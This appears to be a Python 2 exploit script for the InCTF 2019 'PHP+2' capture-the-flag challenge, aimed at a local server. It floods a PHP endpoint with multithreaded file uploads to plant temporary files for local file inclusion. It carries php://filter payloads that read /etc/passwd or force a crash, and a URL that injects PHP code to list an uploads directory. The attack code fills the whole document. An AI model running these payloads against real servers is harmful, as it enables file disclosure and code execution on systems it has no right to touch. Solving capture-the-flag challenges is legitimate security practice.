import requests
import string
from multiprocessing.dummy import Pool as ThreadPool

charset = string.digits + string.letters

host = "127.0.0.1"
port = 80
base_url = "http://%s:%d" % (host, port)


def upload_file_to_include(url):
    files = {'file': open('test1.txt','rb')}
    try:
        response = requests.post(url, files=files)
    except Exception as e:
        print e


def generate_tmp_files(i):
    # phpinfo_url = "%s/Trash/trial15.php?file=php://filter/string.strip_tags/resource=/etc/passwd" % (
    #     base_url)
    #phpinfo_url = base_url + "/Trash/trial15.php?file=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
    phpinfo_url = base_url + '/Challenges/InCTF-2019/PHP+2/?thisfile=/etc&input=$a=((Recursive).(Di).(rectoryIterator));$b=iterate(new%20$a(uploads));'
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url)

def main():
    pool = ThreadPool(32)
    result = pool.map_async( generate_tmp_files, range(32) ).get(0xffff)

if __name__ == "__main__":
    main()
